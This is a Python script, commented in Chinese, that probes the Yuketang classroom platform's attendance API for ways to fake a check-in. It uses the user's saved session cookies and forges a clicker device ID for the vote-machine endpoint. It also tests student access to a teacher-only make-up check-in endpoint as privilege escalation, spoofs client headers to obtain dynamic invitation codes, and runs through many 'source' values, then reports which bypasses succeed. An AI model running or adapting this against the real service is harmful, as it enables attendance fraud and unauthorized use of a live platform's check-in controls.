#!/usr/bin/env python3
"""
雨课堂签到突破测试脚本（纯 Cookie 认证，无 JWT 依赖）

从 yuketang_session.json 读取 Cookie 自动测试所有签到路径，
最终输出一份可读的测试报告，标明哪些方法有效。
"""
import hashlib
import json
import time
import sys
from datetime import datetime

import requests

# ========== 配置 ==========
SESSION_FILE = "yuketang_session.json"
BASE = "https://changjiang.yuketang.cn"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
DESKTOP_HEADERS = {
    "xtbz": "ykt",
    "desktop-v": "v2",
    "X-Client": "desktop",
    "Origin": "file://",
}
# ===========================


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def load_session():
    """从 session 文件加载 Cookie（纯 Cookie，无 JWT）"""
    with open(SESSION_FILE, "r") as f:
        state = json.load(f)

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})
    s.headers.update(DESKTOP_HEADERS)

    cookies = state.get("desktop_cookies", [])
    if not cookies:
        log("❌ session 文件中没有 Cookie 数据，请先运行 yuketang_helper.py --qr 登录")
        sys.exit(1)

    for c in cookies:
        s.cookies.set(
            c["name"], c["value"],
            domain=c.get("domain", "changjiang.yuketang.cn"),
            path=c.get("path", "/"),
        )

    return s, state


# 测试结果收集
report = []


def record(name, status, detail=""):
    """记录一条测试结果"""
    report.append({"name": name, "status": status, "detail": detail})


def api(session, method, path, **kwargs):
    """发起请求，返回解析后的 JSON 或 None"""
    url = f"{BASE}{path}"
    try:
        r = session.request(method, url, timeout=10, **kwargs)
        ct = r.headers.get("Content-Type", "")
        if "json" in ct:
            return r.json(), r.status_code
        return None, r.status_code
    except Exception as e:
        return None, str(e)


def check_success(data, http_status):
    """判断 API 是否成功"""
    if data is None:
        return False
    code = data.get("code", data.get("Status", None))
    if code == 0 or code == 200:
        return True
    return False


def get_error_msg(data, http_status):
    """提取错误信息"""
    if data is None:
        return f"HTTP {http_status} (非 JSON)"
    code = data.get("code", data.get("Status", "?"))
    msg = data.get("msg", data.get("Message", data.get("message", "")))
    return f"code={code} {msg}"


# ==============================================================
#  测试函数
# ==============================================================

def test_login(session):
    """测试 Cookie 登录态"""
    print("\n" + "=" * 55)
    print("  测试 Cookie 登录态")
    print("=" * 55)

    data, status = api(session, "GET", "/api/v3/user/basic-info")
    if check_success(data, status):
        u = data["data"]
        uid = u.get("id")
        info = f"用户={u.get('name')} uid={uid} 学校={u.get('school')} role={u.get('role')}"
        log(f"✅ {info}")
        record("Cookie 登录态", "✅ 有效", info)
        return uid
    else:
        msg = get_error_msg(data, status)
        log(f"❌ Cookie 无效: {msg}")
        record("Cookie 登录态", "❌ 无效", msg)
        return None


def test_active_lesson(session, state):
    """获取活跃课堂"""
    print("\n" + "=" * 55)
    print("  获取活跃课堂")
    print("=" * 55)

    data, status = api(session, "GET", "/api/v3/classroom/on-lesson-upcoming-exam")
    if check_success(data, status):
        active = data["data"].get("onLessonClassrooms", [])
        if active:
            lid = active[0].get("lessonId")
            cid = active[0].get("classroomId")
            log(f"★ 活跃课堂: lesson={lid} classroom={cid}")
            record("活跃课堂", "✅ 有课堂进行中", f"lesson={lid}")
            return lid, cid, True
        else:
            log("无活跃课堂，使用历史 ID（结果仅供参考）")
            lid = state.get("last_checkin", {}).get("lesson_id")
            record("活跃课堂", "⚠️ 无活跃课堂", "使用历史 ID 测试，签到相关结果不可靠")
            return lid, None, False
    msg = get_error_msg(data, status)
    record("活跃课堂", "❌ 查询失败", msg)
    return None, None, False


def test_normal_checkin(session, lesson_id, is_active):
    """测试普通签到（source=1）"""
    print("\n" + "=" * 55)
    print("  普通签到 (source=1)")
    print("=" * 55)

    if not lesson_id:
        record("普通签到 (source=1)", "⏭️ 跳过", "无 lessonId")
        return

    data, status = api(session, "POST", "/api/v3/lesson/checkin",
                       json={"lessonId": str(lesson_id), "source": 1})
    if check_success(data, status):
        log("✅ 普通签到成功！")
        record("普通签到 (source=1)", "✅ 成功", "学生身份直接签到")
    else:
        msg = get_error_msg(data, status)
        log(f"✗ {msg}")
        record("普通签到 (source=1)", "❌ 失败" if is_active else "⚠️ 课堂已结束", msg)


def test_code_checkin(session, lesson_id, is_active):
    """测试暗号签到 (source=6)"""
    print("\n" + "=" * 55)
    print("  暗号签到 (source=6)")
    print("=" * 55)

    if not lesson_id:
        record("暗号签到 (source=6)", "⏭️ 跳过", "无 lessonId")
        return

    # 用假暗号测试接口是否可达
    data, status = api(session, "POST", "/api/v3/lesson/checkin",
                       json={"lessonId": str(lesson_id), "source": 6,
                              "inviteCode": "AAAAA", "joinIfNotIn": True})
    if check_success(data, status):
        log("✅ 暗号签到接口可用！（测试暗号意外成功）")
        record("暗号签到 (source=6)", "✅ 接口可用", "需要正确的 5 位暗号")
    else:
        msg = get_error_msg(data, status)
        # 区分"暗号错误"和"接口不可用"
        code = data.get("code") if data else None
        if code == 50004:
            log(f"⚠️ 课堂已结束: {msg}")
            record("暗号签到 (source=6)", "⚠️ 课堂已结束", "接口本身可能可用，需活跃课堂验证")
        elif code in (40004, 40001, 50003):
            log(f"✅ 接口可达，暗号无效: {msg}")
            record("暗号签到 (source=6)", "✅ 接口可达", f"暗号验证正常拒绝: {msg}")
        else:
            log(f"✗ {msg}")
            record("暗号签到 (source=6)", "❌ 失败", msg)


def test_vote_machine(session, lesson_id, is_active):
    """测试投票器签到 (source_type=82)"""
    print("\n" + "=" * 55)
    print("  投票器签到 (source_type=82)")
    print("=" * 55)

    if not lesson_id:
        record("投票器签到 (source_type=82)", "⏭️ 跳过", "无 lessonId")
        return

    device_id = "PEN_" + hashlib.md5(str(lesson_id).encode()).hexdigest()[:12].upper()
    now_ms = int(time.time() * 1000)
    payload = {
        "lesson_id": str(lesson_id),
        "devices": [{"id": device_id, "dt": now_ms}],
        "submit_time": now_ms,
        "source_type": 82,
    }

    log(f"设备ID: {device_id}")
    data, status = api(session, "POST", "/api/v3/vote-machine/lesson-check-in", json=payload)

    if data is None:
        record("投票器签到 (source_type=82)", "❌ 失败", f"HTTP {status}")
        return

    code = data.get("code", data.get("Status", "?"))
    if code == 200 or code == 0:
        rd = data.get("Data") or data.get("data", {})
        users = rd.get("check_in_users", []) if isinstance(rd, dict) else []
        detail = f"设备={device_id}, 签到用户数={len(users)}"
        if users:
            log(f"🔥 投票器签到成功，且有用户签到！{detail}")
            record("投票器签到 (source_type=82)", "🔥 成功（有签到用户）", detail)
        else:
            log(f"✓ 接口返回 200，但无签到用户")
            detail += " (接口接受请求但未实际签到)"
            record("投票器签到 (source_type=82)", "⚠️ 接口接受但结果待验证", detail)
    else:
        msg = data.get("msg", data.get("Message", str(code)))
        log(f"✗ {msg}")
        record("投票器签到 (source_type=82)", "❌ 失败", f"code={code} {msg}")


def test_revise_checkin(session, uid, is_active):
    """测试补签接口越权"""
    print("\n" + "=" * 55)
    print("  补签接口越权 (checkin/revise)")
    print("=" * 55)

    if not uid:
        record("补签接口越权", "⏭️ 跳过", "无 uid")
        return

    data, status = api(session, "POST", "/api/v3/lesson/checkin/revise",
                       json={"identityId": str(uid)})
    if check_success(data, status):
        log("🔥 补签成功！学生身份可以自我补签！")
        record("补签接口越权", "🔥 成功（越权可行）", f"identityId={uid}")
    else:
        msg = get_error_msg(data, status)
        log(f"✗ {msg}")
        record("补签接口越权", "❌ 失败（需教师权限）", msg)


def test_dynamic_invitation(session, is_active):
    """测试动态邀请码获取"""
    print("\n" + "=" * 55)
    print("  动态邀请码获取 (各客户端伪装)")
    print("=" * 55)

    clients = ["desktop", "mobile", "web"]
    any_success = False

    for client in clients:
        headers = {"X-Client": client}
        if client == "desktop":
            headers["desktop-v"] = "v2"

        old_h = dict(session.headers)
        session.headers.update(headers)
        data, status = api(session, "GET", "/api/v3/lesson/fetch-dynamic-invitation",
                           params={"v": 2})
        session.headers.clear()
        session.headers.update(old_h)

        if check_success(data, status):
            qr = data.get("data", {}).get("qrContent", "?")
            log(f"🔥 [{client}] 获取动态邀请码成功！qrContent={qr[:30]}...")
            record(f"动态邀请码 [{client}]", "🔥 成功", f"qrContent={qr[:50]}")
            any_success = True
        else:
            msg = get_error_msg(data, status)
            log(f"  [{client}] ✗ {msg}")
        time.sleep(0.2)

    if not any_success:
        record("动态邀请码", "❌ 全部失败", "需教师权限或课堂 Token")


def test_source_values(session, lesson_id, is_active):
    """测试各种 source 值"""
    print("\n" + "=" * 55)
    print("  source 值穷举")
    print("=" * 55)

    if not lesson_id:
        record("source 值穷举", "⏭️ 跳过", "无 lessonId")
        return

    working = []
    for src in [0, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 82]:
        data, status = api(session, "POST", "/api/v3/lesson/checkin",
                           json={"lessonId": str(lesson_id), "source": src})
        if check_success(data, status):
            log(f"  source={src}: ✅ 成功！")
            working.append(src)
        else:
            code = data.get("code") if data else None
            if code != 50004:  # 不是 LESSON_END 才报告
                msg = get_error_msg(data, status)
                log(f"  source={src}: ✗ {msg}")
        time.sleep(0.2)

    if working:
        record("source 值穷举", "🔥 有可用值", f"成功的 source: {working}")
    else:
        note = "全部 LESSON_END" if not is_active else "全部失败"
        record("source 值穷举", "❌ " + note, "需活跃课堂重测" if not is_active else "")


def test_ticket_checkin(session, lesson_id, is_active):
    """测试 ticket 签到接口"""
    print("\n" + "=" * 55)
    print("  ticket 签到 (source=14)")
    print("=" * 55)

    if not lesson_id:
        record("ticket 签到 (source=14)", "⏭️ 跳过", "无 lessonId")
        return

    data, status = api(session, "POST", "/api/v3/lesson/checkin",
                       json={"source": 14, "ticket": "TEST_PROBE"})
    if data:
        code = data.get("code")
        msg = data.get("msg", "")
        if code == 50004:
            record("ticket 签到 (source=14)", "⚠️ 课堂已结束", "接口可达，需真实 ticket 验证")
        elif code == 0:
            record("ticket 签到 (source=14)", "🔥 成功", "假 ticket 竟然通过了！")
        elif "ticket" in str(msg).lower() or "invalid" in str(msg).lower():
            log(f"✅ 接口可达，ticket 校验正常: {msg}")
            record("ticket 签到 (source=14)", "✅ 接口可达", f"需要真实 ticket: {msg}")
        else:
            record("ticket 签到 (source=14)", "❌ 失败", f"code={code} {msg}")
    else:
        record("ticket 签到 (source=14)", "❌ 失败", f"HTTP {status}")


def test_mqtt_token(session):
    """测试 MQTT Token 获取"""
    print("\n" + "=" * 55)
    print("  MQTT Token 获取")
    print("=" * 55)

    data, status = api(session, "GET", "/api/v3/connection/get-token")
    if check_success(data, status):
        mt = data.get("data", {})
        log(f"✅ MQTT Token 获取成功！")
        log(f"  {json.dumps(mt, ensure_ascii=False)[:200]}")
        record("MQTT Token", "✅ 成功", f"server={mt.get('domain', '?')}")
    else:
        msg = get_error_msg(data, status)
        log(f"✗ {msg}")
        record("MQTT Token", "❌ 失败", msg)


# ==============================================================
#  报告输出
# ==============================================================

def print_report(is_active):
    """打印最终测试报告"""
    print("\n")
    print("╔" + "═" * 72 + "╗")
    print("║" + "  雨课堂签到突破测试报告".center(62) + "║")
    print("║" + f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}".center(68) + "║")
    if not is_active:
        print("║" + "  ⚠️  当前无活跃课堂，签到测试结果仅供参考".center(52) + "║")
    print("╠" + "═" * 72 + "╣")

    for r in report:
        name = r["name"]
        status = r["status"]
        detail = r["detail"]
        # 截断过长的内容
        if len(detail) > 50:
            detail = detail[:47] + "..."
        print(f"║  {status} {name}")
        if detail:
            print(f"║     └─ {detail}")
    print("╚" + "═" * 72 + "╝")

    # 汇总可行方法
    viable = [r for r in report if "🔥" in r["status"] or ("✅ 成功" in r["status"] and "登录" not in r["name"])]
    reachable = [r for r in report if "✅ 接口可达" in r["status"] or "✅ 接口可用" in r["status"]]
    pending = [r for r in report if "⚠️" in r["status"] and "课堂已结束" in r["status"]]

    print("\n" + "─" * 55)
    if viable:
        print("🔥 可行的签到方法：")
        for r in viable:
            print(f"   • {r['name']}: {r['detail']}")
    else:
        print("❌ 本次测试未发现可直接使用的签到方法")

    if reachable:
        print("\n✅ 接口可达，需要合适条件：")
        for r in reachable:
            print(f"   • {r['name']}: {r['detail']}")

    if pending:
        print("\n⚠️  需要活跃课堂重新验证：")
        for r in pending:
            print(f"   • {r['name']}")

    print("─" * 55)


# ==============================================================
#  主流程
# ==============================================================
def main():
    session, state = load_session()

    # 1. 验证登录态
    uid = test_login(session)
    if not uid:
        log("Cookie 无效，无法继续测试。请重新登录。")
        print_report(False)
        sys.exit(1)

    # 2. 获取课堂
    lesson_id, classroom_id, is_active = test_active_lesson(session, state)

    # 3. 全部测试
    test_normal_checkin(session, lesson_id, is_active)
    test_code_checkin(session, lesson_id, is_active)
    test_vote_machine(session, lesson_id, is_active)
    test_revise_checkin(session, uid, is_active)
    test_dynamic_invitation(session, is_active)
    test_source_values(session, lesson_id, is_active)
    test_ticket_checkin(session, lesson_id, is_active)
    test_mqtt_token(session)

    # 4. 输出报告
    print_report(is_active)


if __name__ == "__main__":
    main()
